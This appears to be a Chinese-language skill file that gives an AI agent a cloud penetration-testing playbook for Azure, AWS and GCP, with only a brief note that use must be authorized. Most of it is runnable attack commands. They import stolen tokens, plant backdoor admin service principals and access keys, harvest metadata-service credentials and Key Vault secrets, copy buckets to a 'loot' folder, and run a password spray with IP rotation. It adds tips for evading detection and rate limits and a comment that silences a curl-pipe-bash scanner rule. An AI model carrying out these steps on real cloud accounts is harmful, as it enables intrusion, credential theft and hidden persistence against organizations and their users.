---
name: cloud-penetration-testing
description: "对 Microsoft Azure、Amazon Web Services (AWS) 和 Google Cloud Platform (GCP) 的云基础设施进行全面安全评估。当用户要求'云渗透测试'、'云安全评估'、'AWS渗透测试'、'Azure安全测试'、'GCP渗透'时使用。"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：本技能仅用于授权的安全评估、防御性验证或受控的教育环境。

<!-- security-allowlist: curl-pipe-bash -->

# 云渗透测试

## 目的

对 Microsoft Azure、Amazon Web Services (AWS) 和 Google Cloud Platform (GCP) 的云基础设施进行全面安全评估。本技能涵盖侦察、身份认证测试、资源枚举、权限提升、数据提取和持久化技术，适用于授权的云安全评估项目。

## 前置条件

### 所需工具
```bash
# Azure 工具
Install-Module -Name Az -AllowClobber -Force
Install-Module -Name MSOnline -Force
Install-Module -Name AzureAD -Force

# AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# GCP CLI
curl https://sdk.cloud.google.com | bash
gcloud init

# 其他工具
pip install scoutsuite pacu
```

### 所需知识
- 云架构基础
- 身份与访问管理 (IAM)
- API 身份认证机制
- DevOps 和自动化概念

### 所需权限
- 书面测试授权
- 测试凭证或访问令牌
- 明确的测试范围和交战规则

## 输出与交付物

1. **云安全评估报告** - 全面的发现和风险评级
2. **资源清单** - 已枚举的服务、存储和计算实例
3. **凭证发现** - 暴露的密钥、密钥和配置错误
4. **修复建议** - 各平台的加固指导

## 核心工作流程

### 阶段 1：侦察

收集目标云环境初始信息：

```bash
# Azure：获取联合身份信息
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"

# Azure：获取租户 ID
curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"

# 通过公司名称枚举云资源
python3 cloud_enum.py -k targetcompany

# 检查 IP 是否属于云服务商
cat ips.txt | python3 ip2provider.py
```

### 阶段 2：Azure 身份认证

认证到 Azure 环境：

```powershell
# Az PowerShell 模块
Import-Module Az
Connect-AzAccount

# 使用凭证认证（可能绕过 MFA）
$credential = Get-Credential
Connect-AzAccount -Credential $credential

# 导入窃取的上下文
Import-AzContext -Profile 'C:\Temp\StolenToken.json'

# 导出上下文用于持久化
Save-AzContext -Path C:\Temp\AzureAccessToken.json

# MSOnline 模块
Import-Module MSOnline
Connect-MsolService
```

### 阶段 3：Azure 枚举

发现 Azure 资源和权限：

```powershell
# 列出上下文和订阅
Get-AzContext -ListAvailable
Get-AzSubscription

# 当前用户角色分配
Get-AzRoleAssignment

# 列出资源
Get-AzResource
Get-AzResourceGroup

# 存储账户
Get-AzStorageAccount

# Web 应用程序
Get-AzWebApp

# SQL 服务器和数据库
Get-AzSQLServer
Get-AzSqlDatabase -ServerName $Server -ResourceGroupName $RG

# 虚拟机
Get-AzVM
$vm = Get-AzVM -Name "VMName"
$vm.OSProfile

# 列出所有用户
Get-MSolUser -All

# 列出所有组
Get-MSolGroup -All

# 全局管理员
Get-MsolRole -RoleName "Company Administrator"
Get-MSolGroupMember -GroupObjectId $GUID

# 服务主体
Get-MsolServicePrincipal
```

### 阶段 4：Azure 漏洞利用

利用 Azure 配置错误：

```powershell
# 搜索用户属性中的密码
$users = Get-MsolUser -All
foreach($user in $users){
    $props = @()
    $user | Get-Member | foreach-object{$props+=$_.Name}
    foreach($prop in $props){
        if($user.$prop -like "*password*"){
            Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)
        }
    }
}

# 在虚拟机上执行命令
Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1

# 提取虚拟机 UserData
$vms = Get-AzVM
$vms.UserData

# 导出 Key Vault 密钥
az keyvault list --query '[].name' --output tsv
az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
az keyvault secret show --id <URI>
```

### 阶段 5：Azure 持久化

在 Azure 中建立持久化：

```powershell
# 创建后门服务主体
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

# 将服务主体添加到全局管理员
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId

# 以服务主体身份登录
$cred = Get-Credential  # AppID 作为用户名，密钥作为密码
Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal

# 通过 CLI 创建新管理员用户
az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
```

### 阶段 6：AWS 身份认证

认证到 AWS 环境：

```bash
# 配置 AWS CLI
aws configure
# 输入：Access Key ID、Secret Access Key、区域、输出格式

# 使用特定配置文件
aws configure --profile target

# 测试凭证
aws sts get-caller-identity
```

### 阶段 7：AWS 枚举

发现 AWS 资源：

```bash
# 账户信息
aws sts get-caller-identity
aws iam list-users
aws iam list-roles

# S3 存储桶
aws s3 ls
aws s3 ls s3://bucket-name/
aws s3 sync s3://bucket-name ./local-dir

# EC2 实例
aws ec2 describe-instances

# RDS 数据库
aws rds describe-db-instances --region us-east-1

# Lambda 函数
aws lambda list-functions --region us-east-1
aws lambda get-function --function-name <name>

# EKS 集群
aws eks list-clusters --region us-east-1

# 网络
aws ec2 describe-subnets
aws ec2 describe-security-groups --group-ids <sg-id>
aws directconnect describe-connections
```

### 阶段 8：AWS 漏洞利用

利用 AWS 配置错误：

```bash
# 检查公开的 RDS 快照
aws rds describe-db-snapshots --snapshot-type manual --query=DBSnapshots[*].DBSnapshotIdentifier
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
# AttributeValues = "all" 表示公开可访问

# 提取 Lambda 环境变量（可能包含密钥）
aws lambda get-function --function-name <name> | jq '.Configuration.Environment'

# 访问元数据服务（从被攻陷的 EC2）
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 访问
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

### 阶段 9：AWS 持久化

在 AWS 中建立持久化：

```bash
# 列出现有访问密钥
aws iam list-access-keys --user-name <username>

# 创建后门访问密钥
aws iam create-access-key --user-name <username>

# 获取所有 EC2 公网 IP
for region in $(cat regions.txt); do
    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
done
```

### 阶段 10：GCP 枚举

发现 GCP 资源：

```bash
# 身份认证
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud auth list

# 账户信息
gcloud config list
gcloud organizations list
gcloud projects list

# IAM 策略
gcloud organizations get-iam-policy <org-id>
gcloud projects get-iam-policy <project-id>

# 已启用的服务
gcloud services list

# 源代码仓库
gcloud source repos list
gcloud source repos clone <repo>

# 计算实例
gcloud compute instances list
gcloud beta compute ssh --zone "region" "instance" --project "project"

# 存储桶
gsutil ls
gsutil ls -r gs://bucket-name
gsutil cp gs://bucket/file ./local

# SQL 实例
gcloud sql instances list
gcloud sql databases list --instance <id>

# Kubernetes
gcloud container clusters list
gcloud container clusters get-credentials <cluster> --region <region>
kubectl cluster-info
```

### 阶段 11：GCP 漏洞利用

利用 GCP 配置错误：

```bash
# 获取元数据服务数据
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"

# 检查访问范围
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'

# 使用密钥环解密数据
gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --key <key> --keyring <keyring> --location global

# 无服务器函数分析
gcloud functions list
gcloud functions describe <name>
gcloud functions logs read <name> --limit 100

# 查找存储的凭证
sudo find /home -name "credentials.db"
sudo cp -r /home/user/.config/gcloud ~/.config
gcloud auth list
```

## 快速参考

### Azure 关键命令

| 操作 | 命令 |
|------|------|
| 登录 | `Connect-AzAccount` |
| 列出订阅 | `Get-AzSubscription` |
| 列出用户 | `Get-MsolUser -All` |
| 列出组 | `Get-MsolGroup -All` |
| 当前角色 | `Get-AzRoleAssignment` |
| 列出虚拟机 | `Get-AzVM` |
| 列出存储 | `Get-AzStorageAccount` |
| Key Vault 密钥 | `az keyvault secret list --vault-name <name>` |

### AWS 关键命令

| 操作 | 命令 |
|------|------|
| 配置 | `aws configure` |
| 调用者身份 | `aws sts get-caller-identity` |
| 列出用户 | `aws iam list-users` |
| 列出 S3 存储桶 | `aws s3 ls` |
| 列出 EC2 | `aws ec2 describe-instances` |
| 列出 Lambda | `aws lambda list-functions` |
| 元数据 | `curl http://169.254.169.254/latest/meta-data/` |

### GCP 关键命令

| 操作 | 命令 |
|------|------|
| 登录 | `gcloud auth login` |
| 列出项目 | `gcloud projects list` |
| 列出实例 | `gcloud compute instances list` |
| 列出存储桶 | `gsutil ls` |
| 列出集群 | `gcloud container clusters list` |
| IAM 策略 | `gcloud projects get-iam-policy <project>` |
| 元数据 | `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/...` |

### 元数据服务 URL

| 云服务商 | URL |
|----------|-----|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2018-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

### 常用工具

| 工具 | 用途 |
|------|------|
| ScoutSuite | 多云安全审计 |
| Pacu | AWS 漏洞利用框架 |
| AzureHound | Azure AD 攻击路径映射 |
| ROADTools | Azure AD 枚举 |
| WeirdAAL | AWS 服务枚举 |
| MicroBurst | Azure 安全评估 |
| PowerZure | Azure 后渗透 |

## 约束与限制

### 法律要求
- 仅在明确的书面授权下进行测试
- 遵守云账户之间的范围边界
- 不要访问生产环境的客户数据
- 记录所有测试活动

### 技术限制
- MFA 可能阻止基于凭证的攻击
- 条件访问策略可能限制访问
- CloudTrail/活动日志记录所有 API 调用
- 某些资源需要特定区域访问

### 检测考虑
- 云服务商记录所有 API 活动
- 异常访问模式会触发告警
- 使用缓慢、谨慎的枚举方式
- 考虑 GuardDuty、Security Center、Cloud Armor

## 示例

### 示例 1：Azure 密码喷洒

**场景：** 测试 Azure AD 密码策略

```powershell
# 使用 MSOLSpray 和 FireProx 进行 IP 轮换
# 首先创建 FireProx 端点
python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create

# 喷洒密码
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
```

### 示例 2：AWS S3 存储桶枚举

**场景：** 查找并访问配置错误的 S3 存储桶

```bash
# 列出所有存储桶
aws s3 ls | awk '{print $3}' > buckets.txt

# 检查每个存储桶的内容
while read bucket; do
    echo "Checking: $bucket"
    aws s3 ls s3://$bucket 2>/dev/null
done < buckets.txt

# 下载感兴趣的存储桶
aws s3 sync s3://misconfigured-bucket ./loot/
```

### 示例 3：GCP 服务账户入侵

**场景：** 使用被攻陷的服务账户进行横向移动

```bash
# 使用服务账户密钥认证
gcloud auth activate-service-account --key-file compromised-sa.json

# 列出可访问的项目
gcloud projects list

# 枚举计算实例
gcloud compute instances list --project target-project

# 检查元数据中的 SSH 密钥
gcloud compute project-info describe --project target-project | grep ssh

# SSH 到实例
gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
```

## 故障排除

| 问题 | 解决方案 |
|-------|-----------|
| 身份认证失败 | 验证凭证；检查 MFA；确保正确的租户/项目；尝试其他认证方法 |
| 权限被拒绝 | 列出当前角色；尝试不同资源；检查资源策略；验证区域 |
| 元数据服务被阻止 | 检查 IMDSv2 (AWS)；验证实例角色；检查 169.254.169.254 的防火墙 |
| 速率限制 | 添加延迟；分散到不同区域；使用多个凭证；专注于高价值目标 |

## 参考资料

- [高级云脚本](references/advanced-cloud-scripts.md) - Azure Automation Runbook、Function Apps 枚举、AWS 数据渗出、GCP 高级漏洞利用

## 使用时机
本技能适用于执行概述中描述的工作流程或操作。
